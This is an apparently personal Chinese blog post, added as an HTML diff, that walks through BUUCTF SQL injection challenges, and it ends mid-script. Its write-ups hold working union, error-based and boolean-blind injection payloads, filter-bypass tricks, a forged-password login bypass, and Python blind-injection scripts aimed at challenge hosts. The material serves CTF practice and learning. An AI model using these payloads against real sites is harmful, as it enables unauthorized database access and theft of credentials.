@@ -1,0 +1,872 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/myavatar.jpg">
+  <link rel="icon" href="/img/myavatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="5i1encee">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CBCTF的简要wp......">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF SQL 刷题">
+<meta property="og:url" content="http://5i1encee.top/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="5i1encee&#39;s Blog">
+<meta property="og:description" content="CBCTF的简要wp......">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://5i1encee.top/img/BUU.png">
+<meta property="article:published_time" content="2025-03-12T03:58:22.000Z">
+<meta property="article:modified_time" content="2025-03-28T15:38:17.484Z">
+<meta property="article:author" content="5i1encee">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://5i1encee.top/img/BUU.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BUUCTF SQL 刷题 - 5i1encee&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"5i1encee.top","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>5i1encee</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/BUU.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF SQL 刷题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        5i1encee
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-12 11:58" pubdate>
+          2025年3月12日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF SQL 刷题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="BUUCTF-SQL-刷题"><a href="#BUUCTF-SQL-刷题" class="headerlink" title="BUUCTF SQL 刷题"></a>BUUCTF SQL 刷题</h1><h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>分析流量包，可以看出是布尔型 SQL 盲注的过程，注入语句不再具体分析，这里复习一下 wireshark 的使用</p>
+<p>找到正确时的响应包</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;OusVbMRC4o51aWxF61IcewiPnve.png)</p>
+<p>根据内容长度筛选</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;FrLJbUgCso9fGvxBcohcsnazn8g.png)</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;JGMbbFkWkopOCgxmVEwcUQB2nVf.png)</p>
+<p>响应包中可以看到请求的 url</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;J6zFbtwv7oEN8WxiaR0ce5tZnub.png)</p>
+<p>导出所有符合要求的响应包内容</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;NTDAbbVUbohPwuxFl4Vc8FEmnLe.png)</p>
+<p>写一个脚本正则匹配提取信息并输出 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sql.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>flag = [<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> f.readlines():<br>    num = re.search(<span class="hljs-string">r&quot;limit%200,1\)\),%20(\d+),%201\)\)&quot;</span>,l)<br>    part = re.search(<span class="hljs-string">r&quot;,%201\)\)&gt;(\d+)]&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">and</span> part:<br>        flag[<span class="hljs-built_in">int</span>(num.group(<span class="hljs-number">1</span>))] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(part.group(<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>)<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(f,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="BUU-SQL-COURSE"><a href="#BUU-SQL-COURSE" class="headerlink" title="BUU SQL COURSE"></a>BUU SQL COURSE</h1><p>登录未能注入成功，浏览器观察网络模块发现新闻点击时可能存在注入，所以复制 url 开始尝试</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;I4WhbD5rpoJ0qNx7zlJceNGhnme.png)</p>
+<p><code>?id=1 and 1=1</code> 时仍是相同回显</p>
+<p><code>?id=1 and 1=2</code> 时无回显，说明为数字型</p>
+<p><code>?id=1 order by 2</code> 有正常回显，<code>?id=1 order by 3</code> 无，说明为 2 列</p>
+<p><code>?id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code> 即可得到数据库名、表名</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;IXUnb4AFSoT7jhxE2Wucs5UQnJe.png)</p>
+<p>后续依次获取列名、内容即可</p>
+<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>尝试判断闭合类型，结尾使用注释</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;WUQZbgFmrombgMxEdN2cbOhHnof.png)</p>
+<p>在密码 123 处报错，说明密码的闭合方式为双引号且注释未生效，尝试 <code>1&#39; and 1=1 -- -</code></p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QAJfbgSDFoVJ42x3kbucknkVnTb.png)</p>
+<p>未出现如上报错，注释成功，未出现其他报错，闭合方式正确，输入 <code>1&#39; order by 5 -- -</code> 逐一尝试</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;FNAebYobGomIfrxSZdgcFa6Tnuf.png)</p>
+<p><code>1&#39; order by 4 -- -</code> 时报错，<code>1&#39; order by 3 -- -</code> 未报错，说明 3 列</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;EzxjbooRXoIJgJxb4Ldcs7hgnb1.png)</p>
+<p>输入 <code>1&#39; union select 1,2,3 -- -</code> 判断显示位置，直接结束。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;JgCrb5IWGoabbixlF4LcIA3Fn5m.png)</p>
+<p><strong>其实直接</strong> <code>1&#39; or 1=1 #</code> <strong>完事……</strong></p>
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>输入 <code>1&#39; and 1=1 -- -</code>，显示 do not hack me 发现有过滤，多试几个就发现 and、or、&#x3D;均有过滤，尝试大小写成功绕过。</p>
+<p>输入 <code>1&#39; Order By 3 -- -</code> 无报错，<code>1&#39; Order By 4 -- -</code> 报错，说明共三列</p>
+<p>输入 <code>1&#39; union select 1,2,3 -- -</code> 仍为 wrong user，没发现回显位置</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;AFKxbgFwNo9rcdxYw7kcvwynnAf.png)</p>
+<p>但是发现注释如下（原本就有之前没看到），base32+base64 解密可得明文</p>
+<p><code>select * from user where username = &#39;$name&#39;</code></p>
+<p>那么逻辑应该就是先根据用户名查找，然后再校验密码。</p>
+<p>用户名直接输入 admin，存在该用户，返回 wrong pass</p>
+<p>已知一个用户名后用 union select 去探测一下用户名所在列，输入 <code>1&#39; union select &#39;admin&#39;,2,3 -- -</code> 返回 wrong user，输入 <code>1&#39; union select 1,&#39;admin&#39;,3 -- -</code> 返回 wrong pass，说明用户名位于第二列，可以推测密码即第三列。</p>
+<p>但是后面就不知道怎么搞了，只能去看源码，输入的密码 md5 加密后要与数据库第三列数据一致才能获得 flag。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QZ0AbwarKoF7Plx2DRxcfaYknHh.png)</p>
+<p>网上搜索了一下，发现 union 联合查询时如果查询的数据不存在，就会构建一个虚拟的数据，可能这也是为什么 <code>1&#39; union select 1,2,3 -- -</code> 可以探测回显位置，1<del>3 在表内原本不存在，union 查询后先构造了虚拟的 1</del>3 的数据，然后再读取返回到有回显的位置。</p>
+<p>由于是先查询用户名再判断密码是否正确，所以本题可以利用 union 联合查询在用户名处注入，向密码列写入一个 md5 值，然后在密码处输入 md5 对应的明文，那么在查询完用户名后虚拟数据构造完成，判断密码时就将密码栏输入的内容 md5 加密后与虚拟数据的密码列内容比较，也就绕过了原本的密码。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">例如：                                  （<span class="hljs-number">123</span> md5后的结果）<br>用户：<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&#x27; <span class="hljs-comment">-- -</span><br>密码：<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>逐个尝试发现 and、&#x3D;、&gt;、&lt;、空格、union 均被过滤，双写及大小写均无法绕过，但是存在报错信息，考虑报错注入。</p>
+<p>输入 <code>1&#39;&quot;</code> 报错，<code>use near &#39;&quot;&#39; and password=&#39;123&#39;&#39; at line 1</code>，所以单引号闭合</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;X4Tfb1kbboP7d7xO2FZcfjDrnLb.png)</p>
+<p>输入 <code>1&#39;</code> 报错，输入 <code>1&#39;#</code> 不报错，<code>#</code> 成功注释</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;AJEFbUNbXoXesOx2ykQcF5q9npe.png)</p>
+<p>因为空格被过滤，括号正常，所以可以套括号代替空格。<code>extractvalue()</code> 函数去触发报错，<code>concat()</code> 拼接一下内容。输入 <code>1&#39;or(extractvalue(1,concat(0x7e,database())))#</code>，成功得到数据库名。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;UwYLbR2kooz1FJx4PMlcDWb8nIh.png)</p>
+<p>这里注意整个 select 语句外面也要套一层括号，用 <code>like</code> 代替 <code>=</code> 继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)))))#</code>，获得表名。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QPlhbUB0totaT5xuGQWcgb42nDh.png)</p>
+<p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))#</code>，获得列名。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Be9PbyEnAoovDnxikzQcsfb0nBc.png)</p>
+<p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)))))#</code>，获得 username 和 password 列的内容。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Em56bWLD5oa4vxxfiFfcoaiinzx.png)</p>
+<p>显示不完全，用 <code>substring(str,num1,num2)</code> 函数调整位置，结果发现这个也过滤了，换用 <code>right</code> 尝试 <code>1&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),30))))#</code>，成功，拼接即得 flag。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;UfYgb6VlWo2S67xoN8GctLwqn2g.png)</p>
+<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>登录栏测了一下基本都过滤了，选择正确代码发现存在注入，但是 union、and、空格这些过滤了大部分，而且没有回显位，应该就是考布尔盲注。用 python 脚本二分法去跑结果</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import re<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">&quot;http://df6d4f70-e3c4-46b8-86fb-7d59ae29eb14.node5.buuoj.cn:81/search.php?id=&quot;</span><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">0</span><br><br>keywords = <span class="hljs-string">&quot;ERROR&quot;</span><span class="hljs-comment">#&quot;Click others&quot;</span><br><br>def boolean_query(url,payload):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.<span class="hljs-built_in">get</span>(url + payload)<br>    elif method == <span class="hljs-number">1</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, payload)<br>    elif method == <span class="hljs-number">2</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, json=payload)<br>    <span class="hljs-literal">return</span> keywords <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br>def get_length(url,payload):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-literal">return</span> i<br>    <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br><br>def get_name(url,<span class="hljs-built_in">length</span>,payload):<br>    results=[]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">length</span> = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">170</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,<span class="hljs-keyword">mid</span>=<span class="hljs-keyword">mid</span>)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            break<br>        name += chr(low)<br>        print(chr(low),<span class="hljs-keyword">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-literal">return</span> name<br><br>payload = payloads[x]<br><span class="hljs-built_in">length</span> = get_length(url,payload)<br><span class="hljs-built_in">result</span> = get_name(url,<span class="hljs-built_in">length</span>,payload)<br>print(f<span class="hljs-string">&quot;\n[+] Found : &#123;result&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>先跑所有数据库名</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;ZWFubIQemoP1duxlppvcvHzSnrd.png)</p>
+<p>然后跑出 geek 库的表名</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Uuffb5xTxo7EsbxoYWfc0iy7nRc.png)</p>
+<p>然后跑出 geek 库 Flaaaaag 表的列名</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Udu9bk5OcoclUxxS6BYcWykInmc.png)</p>
+<p>然后发现被骗了</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H6aYbClnJoIjYmxPEqUcs7gLnTg.png)</p>
+<p>换 F1naI1y 表跑，大概就这样，内容部分有错误。</p>
+<p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;WQ3sb0fGRoDaZIxTsctc3Pz0n0K.png)</p>
+<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>输入 1、2 均有结果，空格、+ 被过滤，发现 %20 可替代，and、or、union、information、(group、%20group、均过滤。</p>
+<p>综合考虑，可以用 concat()代替 group_concat()，空格沿用前面一题的括号，information 可以改用 sys.schema_auto_increment_columns 查表，但是再一看题目已经给出 flag 所在表和列了，那就直接爆就好了。按我的注入语句来说，当 Hello, glzjin wants a girlfriend.出现的时候即判断正确，Error Occured When Fetch Result.出现即判断错误，其他即注入语句本身有误。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://23f0fee2-b6ad-4a70-88b9-b13213bde7f9.node5.buuoj.cn:81/index.php&quot;</span><br><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span 